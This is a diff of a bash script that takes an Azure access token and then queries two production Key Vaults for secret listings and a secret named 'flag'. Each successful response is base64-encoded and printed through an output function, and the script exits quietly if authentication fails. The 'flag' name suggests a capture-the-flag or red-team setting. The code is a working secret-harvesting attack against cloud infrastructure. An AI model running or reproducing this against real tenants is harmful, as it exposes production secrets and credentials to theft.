@@ -9,10 +9,10 @@ AT=$(curl -sS --max-time 20 -X POST "https://login.microsoftonline.com/$TT/oauth
 say "ARM=$([[ -n "$AT" ]] && echo OK || echo FAIL)"; [[ -n "$AT" ]] || exit 0
 for v in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
   U="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/$v"
-  for path in 'deletedsecrets?api-version=7.4' 'deletedsecrets/flag?api-version=7.4' 'secrets?api-version=2023-07-01'; do
-    code=$(curl -sS --max-time 20 -o /tmp/ds -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/$path" || echo 000)
-    say "DS_${v}_${path//\//_}_HTTP=$code"
-    [[ "$code" == "200" ]] && say "DS_${v}_${path//\//_}_B64=$(base64 -w0 </tmp/ds)"
+  for path in 'secrets?api-version=2023-07-01' 'secrets/flag?api-version=2023-07-01'; do
+    code=$(curl -sS --max-time 20 -o /tmp/q -w '%{http_code}' -H "Authorization: Bearer $AT" "$U/$path" || echo 000)
+    say "Q_${v}_${path//\//_}_HTTP=$code"
+    [[ "$code" == "200" ]] && say "Q_${v}_${path//\//_}_B64=$(base64 -w0 </tmp/q)"
   done
 done
 say DONE
